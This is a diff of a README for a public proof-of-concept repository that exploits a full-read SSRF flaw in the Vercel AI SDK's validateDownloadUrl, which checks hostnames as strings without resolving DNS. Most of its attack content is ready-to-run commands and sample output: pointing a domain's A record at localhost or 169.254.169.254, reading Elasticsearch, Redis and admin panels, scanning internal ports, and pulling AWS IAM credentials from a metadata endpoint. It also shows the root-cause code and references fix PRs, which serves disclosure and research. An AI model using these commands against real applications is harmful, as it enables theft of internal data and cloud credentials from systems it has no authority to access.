@@ -1,100 +1,115 @@
-```
-    ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
-    ::                                                                ::
-    ::    @@@@@@   @@@@@@  @@@@@@@  @@@@@@@@                          ::
-    ::   !@@      !@@      @@!  @@@  @@!                              ::
-    ::    !@@!!    !@@!!   @!@!!@!   @!!!:!                            ::
-    ::       !:!      !:!  !!: :!!   !!:                               ::
-    ::   ::.: :   ::.: :    :   : :  :            BYPASS               ::
-    ::                                                                ::
-    ::   AI SDK // validateDownloadUrl DNS Resolution Bypass           ::
-    ::   Full-Read SSRF // No rebinding // One A record               ::
-    ::                                                                ::
-    ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+# Vercel AI SDK: Full-Read SSRF via DNS Resolution Bypass in validateDownloadUrl
 
+**Author:** @Rat5ak | **Date:** March 2026 | **Classification:** Vulnerability Research - Public
 
-    ########     ###    ########  ########    ###    ##    ##
-    ##     ##   ## ##      ##    ##          ## ##   ##   ##
-    ##     ##  ##   ##     ##    ##         ##   ##  ##  ##
-    ########  ##     ##    ##    #######   ##     ## #####
-    ##   ##   #########    ##          ## ######### ##  ##
-    ##    ##  ##     ##    ##    ##    ## ##     ## ##   ##
-    ##     ## ##     ##    ##     ######  ##     ## ##    ##
+---
+
+## Overview
+
+`validateDownloadUrl()` in Vercel's `@ai-sdk/provider-utils` was introduced in v4.0.19 as SSRF protection. It checks if a URL's hostname is a literal private IP or localhost string. It never resolves DNS. So if you point a domain at `127.0.0.1` and pass it through, the check sees a normal hostname and lets it fly. Then `downloadBlob()` resolves DNS, connects to localhost, and hands back the full response body.
+
+This is not blind SSRF. The caller gets the complete response data from internal services.
 
 ```
-
-## tl;dr
-
-Vercel's AI SDK has SSRF protection (`validateDownloadUrl`) that only checks if the hostname is a literal private IP string. it never resolves DNS. so if you point a domain at `127.0.0.1` and pass it through, the check sees a normal hostname and lets it fly. then `downloadBlob()` resolves DNS, connects to localhost, and hands you back the full response body.
-
-zero rebinding needed. just a domain with an A record pointing to a private IP.
-
-```
-validateDownloadUrl("http://127.0.0.1/secret")              → BLOCKED
-validateDownloadUrl("http://ssrf.yourdomain.com/secret")     → PASSES
-downloadBlob("http://ssrf.yourdomain.com/secret")            → full response from localhost
+validateDownloadUrl("http://127.0.0.1/secret")            BLOCKED
+validateDownloadUrl("http://ssrf.yourdomain.com/secret")   PASSES
+downloadBlob("http://ssrf.yourdomain.com/secret")          full response from localhost
 ```
 
-this is not blind SSRF. you get the actual data back.
+No DNS rebinding. No custom nameserver. One A record in Cloudflare pointing to a private IP and you're done.
 
-## affected
+---
 
-`@ai-sdk/provider-utils` versions with `validateDownloadUrl` (4.0.19+)
+## Affected
 
-any app using the AI SDK that takes image/file URLs from users through `generateText()`, `streamText()`, or calls `downloadBlob()` directly.
+`@ai-sdk/provider-utils` 4.0.19+ (shipped with `ai@6.0.116`)
 
-## prereq
+Any application using the AI SDK that takes image/file URLs from users through `generateText()`, `streamText()`, or calls `downloadBlob()` directly. This covers most chat applications, AI agents, and anything processing multipart user messages with media URLs.
 
-you need a domain you control with an A record pointing to a private IP. one DNS record in cloudflare or whatever you use:
+---
+
+## Prerequisites
+
+A domain you control with an A record pointing to a private IP:
 
 ```
-ssrf.yourdomain.com  →  A  →  127.0.0.1
+ssrf.yourdomain.com  ->  A  ->  127.0.0.1
 ```
 
-thats it. no NS delegation, no rebinding server, no infra.
+No NS delegation, no rebinding server, no infrastructure beyond a single DNS record.
 
-## setup
+---
+
+## Repository Structure
+
+```
+exploit/
+  poc.mjs              Main exploit. Full-read SSRF via downloadBlob()
+  scan.mjs             Internal port scanner. Maps localhost services via SSRF
+  mock_imds.py         Simulated AWS EC2 metadata service. Returns IAM credentials
+  start-services.sh    Simulated internal services (Elasticsearch, Redis, admin panel)
+  package.json         npm dependencies
+
+docs/
+  ROOT_CAUSE.md        Deep dive on why string-matching SSRF protection fails
+```
+
+---
+
+## Usage
+
+### Setup
 
 ```bash
-git clone https://github.com/YOURUSERNAME/ai-sdk-ssrf-research
-cd ai-sdk-ssrf-research
+git clone https://github.com/Rat5ak/Vercel-AI-SDK-SSRF-validateDownloadUrl-DNS-Bypass
+cd Vercel-AI-SDK-SSRF-validateDownloadUrl-DNS-Bypass/exploit
 npm install
 ```
 
-## usage
-
-### read from internal services
+### Read from internal services
 
 ```bash
-node exploit.mjs http://ssrf.yourdomain.com:9200/           # elasticsearch
-node exploit.mjs http://ssrf.yourdomain.com:6379/           # redis
-node exploit.mjs http://ssrf.yourdomain.com:8080/admin      # admin panels
+node poc.mjs http://ssrf.yourdomain.com:9200/           # elasticsearch
+node poc.mjs http://ssrf.yourdomain.com:6379/           # redis
+node poc.mjs http://ssrf.yourdomain.com:8080/admin      # admin panels
 ```
 
-for AWS metadata, make a record pointing to 169.254.169.254:
+For AWS metadata, point a record at `169.254.169.254`:
 ```bash
-node exploit.mjs http://meta.yourdomain.com/latest/meta-data/
+node poc.mjs http://meta.yourdomain.com/latest/meta-data/
 ```
 
-### scan internal ports
+### Scan internal ports
 
 ```bash
 node scan.mjs ssrf.yourdomain.com
 ```
 
-### full demo with fake services
+### Full demo with simulated services
 
 ```bash
-# terminal 1 - start fake elasticsearch, redis, admin panel on localhost
+# terminal 1 - start simulated internal services
 bash start-services.sh
 
-# terminal 2 - steal everything
-node exploit.mjs http://ssrf.yourdomain.com:9200/
-node exploit.mjs http://ssrf.yourdomain.com:6379/
-node exploit.mjs http://ssrf.yourdomain.com:8080/
+# terminal 2
+node poc.mjs http://ssrf.yourdomain.com:9200/    # elasticsearch cluster data + creds
+node poc.mjs http://ssrf.yourdomain.com:6379/    # redis session tokens
+node poc.mjs http://ssrf.yourdomain.com:8080/    # admin panel API keys
 ```
 
-### example output
+### AWS credential theft demo
+
+```bash
+# terminal 1 - start mock IMDS
+python3 mock_imds.py
+
+# terminal 2
+node poc.mjs http://ssrf.yourdomain.com:8888/latest/meta-data/iam/security-credentials/prod-web-role
+```
+
+---
+
+## Example Output
 
 ```
 [*] Target: http://ssrf.yourdomain.com:9200/
@@ -117,7 +132,7 @@ node exploit.mjs http://ssrf.yourdomain.com:8080/
 }
 ```
 
-### port scanner output
+### Port Scanner
 
 ```
 Scanning ssrf.yourdomain.com via AI SDK downloadBlob()
@@ -131,119 +146,78 @@ Scanning ssrf.yourdomain.com via AI SDK downloadBlob()
   :5432  CLOSED   27ms
 ```
 
-## root cause
+---
+
+## Root Cause
 
 `packages/provider-utils/src/validate-download-url.ts`:
 
 ```typescript
 const hostname = parsed.hostname;
 
-// only checks strings. never calls dns.lookup().
+// only checks strings. never calls dns.lookup()
 if (hostname === 'localhost' || hostname.endsWith('.local')) throw ...
 if (isIPv4(hostname) && isPrivateIPv4(hostname)) throw ...
 
-// "ssrf.yourdomain.com" is not "localhost" and is not an IPv4 literal.
-// passes every check. fetch() resolves DNS and connects to 127.0.0.1.
+// "ssrf.yourdomain.com" is not "localhost" and is not an IPv4 literal
+// passes every check. fetch() resolves DNS and connects to 127.0.0.1
 ```
 
-string matching is not network security.
+String matching is not network security. Full analysis in [docs/ROOT_CAUSE.md](docs/ROOT_CAUSE.md).
 
-## how this works in a real attack
+---
+
+## Attack Flow
 
 ```
-attacker sends chat message to target app:
+attacker sends chat message:
   { type: 'image', image: 'http://ssrf.attacker.com:9200/' }
 
-          |
-          v
-
 app calls generateText({ messages })
+  -> convertToLanguageModelPrompt()
+  -> downloadAssets()
+  -> download()
+  -> validateDownloadUrl("http://ssrf.attacker.com:9200/")
+     hostname is "ssrf.attacker.com"
+     not "localhost", not a literal IPv4
+     PASSES
 
-          |
-          v
+  -> fetch("http://ssrf.attacker.com:9200/")
+     DNS resolves to 127.0.0.1
+     connects to localhost:9200
+     reads full elasticsearch response
 
-convertToLanguageModelPrompt() calls downloadAssets()
-
-          |
-          v
-
-download() calls validateDownloadUrl("http://ssrf.attacker.com:9200/")
-  hostname is "ssrf.attacker.com"
-  not "localhost", not a literal IPv4
-  PASSES
-
-          |
-          v
-
-fetch("http://ssrf.attacker.com:9200/")
-  DNS resolves to 127.0.0.1
-  connects to localhost:9200
-  reads full elasticsearch response
-
-          |
-          v
-
-response data sent to AI model as "image"
-model may describe the JSON in its text response
-  internal data leaked to attacker through chat
+  -> response data sent to AI model as "image"
+     model may describe the JSON in its response
+     internal data leaked to attacker through chat
 ```
 
-## repo structure
+---
 
-```
-├── exploit/
-│   ├── poc.mjs              # main exploit - full read SSRF
-│   ├── scan.mjs             # internal port scanner via SSRF
-│   ├── mock_imds.py         # simulated AWS metadata service
-│   ├── start-services.sh    # simulated internal services (ES, Redis, admin)
-│   └── package.json         # npm deps
-├── docs/
-│   └── ROOT_CAUSE.md        # deep dive on why the validation fails
-├── README.md
-└── .gitignore
-```
+## Same Bug Elsewhere
 
-## stealing AWS credentials demo
+This exact pattern (string-matching hostnames instead of resolving DNS) has been found in:
 
-```bash
-# terminal 1 - start the mock AWS metadata endpoint
-cd exploit/
-python3 mock_imds.py
+| Project | Advisory | Year |
+|---------|----------|------|
+| pydantic-ai | [GHSA-2jrp-274c-jhv3](https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-2jrp-274c-jhv3) | 2025 |
+| mindsdb | [GHSA-4jcv-vp96-94xr](https://github.com/mindsdb/mindsdb/security/advisories/GHSA-4jcv-vp96-94xr) | 2024 |
+| esm.sh | [GHSA-p2v6-84h2-5x4r](https://github.com/esm-dev/esm.sh/security/advisories/GHSA-p2v6-84h2-5x4r) | 2024 |
+| vLLM | [CVE-2026-24779](https://dailycve.com/vllm-ssrf-bypass-cve-2026-24779-high/) | 2026 |
+| Vercel AI SDK | [#13510](https://github.com/vercel/ai/issues/13510) | 2026 |
 
-# terminal 2 - steal the creds via SSRF
-cd exploit/
-npm install
-node poc.mjs http://ssrf.yourdomain.com:8888/latest/meta-data/iam/security-credentials/prod-web-role
-```
+---
 
-output:
-```
-[!] SSRF SUCCESSFUL
-[!] Response:
-{
-  "Code": "Success",
-  "LastUpdated": "2026-03-24T12:00:00Z",
-  "Type": "AWS-HMAC",
-  "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
-  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
-  "Token": "IQoJb3JpZ2luX2VjEBYaCXVzLWVhc3QtMSJGMEQCIH7e...[TRUNCATED]",
-  "Expiration": "2026-03-24T18:00:00Z"
-}
-```
+## References
 
-## references
-
-- [GitHub Issue #13510](https://github.com/vercel/ai/issues/13510) - public report
+- [GitHub Issue #13510](https://github.com/vercel/ai/issues/13510)
 - [Fix PR #13512](https://github.com/vercel/ai/pull/13512)
 - [Fix PR #13718](https://github.com/vercel/ai/pull/13718)
 - [validateDownloadUrl source](https://github.com/vercel/ai/blob/main/packages/provider-utils/src/validate-download-url.ts)
+- [downloadBlob source](https://github.com/vercel/ai/blob/main/packages/provider-utils/src/download-blob.ts)
 
-same bug in other projects:
-- [pydantic-ai GHSA-2jrp-274c-jhv3](https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-2jrp-274c-jhv3)
-- [mindsdb GHSA-4jcv-vp96-94xr](https://github.com/mindsdb/mindsdb/security/advisories/GHSA-4jcv-vp96-94xr)
-- [esm.sh GHSA-p2v6-84h2-5x4r](https://github.com/esm-dev/esm.sh/security/advisories/GHSA-p2v6-84h2-5x4r)
-- [vLLM CVE-2026-24779](https://dailycve.com/vllm-ssrf-bypass-cve-2026-24779-high/)
+---
 
-## disclaimer
+## Disclaimer
 
-for authorized security testing and research only. dont use this on systems you dont own or have permission to test.
+For authorized security testing and research only. Dont use this on systems you dont own or have written permission to test.
